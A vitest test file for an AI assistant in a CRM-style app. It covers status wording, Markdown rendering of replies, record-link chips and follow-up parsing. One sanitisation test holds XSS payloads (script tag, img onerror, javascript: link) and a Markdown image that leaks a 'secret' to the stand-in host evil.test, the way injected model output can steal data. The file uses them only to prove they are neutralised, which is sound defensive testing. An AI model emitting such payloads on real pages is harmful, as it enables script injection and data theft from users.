import { describe, expect, it } from 'vitest';
import { thinkingWords } from '../../../../modules/assistant/web/thinking';
import { replyHtml, splitNext } from '../../../../modules/assistant/web/markdown';

const labels = {
  deal: { singular: 'Opportunity', plural: 'Opportunities' },
  contact: { singular: 'Member', plural: 'Members' },
};

describe('assistant thinking words', () => {
  it('follows the question and uses the workspace names', () => {
    const words = thinkingWords('Which opportunities close this month?', labels);
    expect(words).toContain('Looking through opportunities');
    expect(words).toContain('Checking dates');
    expect(words.at(-1)).toBe('Putting the answer together');
    expect(words.join(' ')).not.toMatch(/deal/i);
  });

  it('mentions confirming when the question asks for a change', () => {
    expect(thinkingWords('Add a member called Ana', labels)).toEqual([
      'Reading your question',
      'Looking through members',
      'Drafting the changes for you to confirm',
      'Putting the answer together',
    ]);
  });

  it('still has something to say for a vague question', () => {
    expect(thinkingWords('hello', labels)).toEqual([
      'Reading your question',
      'Searching your records',
      'Putting the answer together',
    ]);
  });
});

describe('assistant reply formatting', () => {
  it('formats Markdown', () => {
    const html = replyHtml('Tracks **Subscriptions** and the `renewal_date` field:\n\n- one\n- two');
    expect(html).toContain('<strong>Subscriptions</strong>');
    expect(html).toContain('<code>renewal_date</code>');
    expect(html).toContain('<li>one</li>');
  });

  it('never lets model text run or load anything', () => {
    const html = replyHtml(
      '<script>alert(1)</script> <img src=x onerror=alert(1)> ![x](https://evil.test/?d=secret) [a](javascript:alert(1)) [b](https://ok.test)',
    );
    expect(html).not.toMatch(/<script|<img|javascript:/i);
    expect(html).toContain('&lt;script&gt;');
    expect(html).toContain('href="https://ok.test" target="_blank" rel="noopener noreferrer nofollow"');
  });
});

describe('assistant record chips and next options', () => {
  const uuid = '01a18d48-7fed-73bc-a2e2-3d5239cef833';
  const path = (entity: string, id: string) => (entity === 'deal' ? `deals/${id}` : null);

  it('turns record links into chips that open in the app', () => {
    const html = replyHtml(
      `See [Big renewal](record:deal/${uuid}) and [a call](record:activity/${uuid}).`,
      path,
    );
    expect(html).toContain(`<a href="#" data-to="/deals/${uuid}" class="ai-chip">Big renewal</a>`);
    expect(html).toContain('<span class="ai-chip">a call</span>');
  });

  it('splits off the follow-ups on the last line', () => {
    expect(splitNext('Two close this month.\n\nNext: Show the biggest one | Who owns them?')).toEqual({
      body: 'Two close this month.',
      next: ['Show the biggest one', 'Who owns them?'],
    });
    expect(splitNext('Next week looks quiet.')).toEqual({ body: 'Next week looks quiet.', next: [] });
  });
});
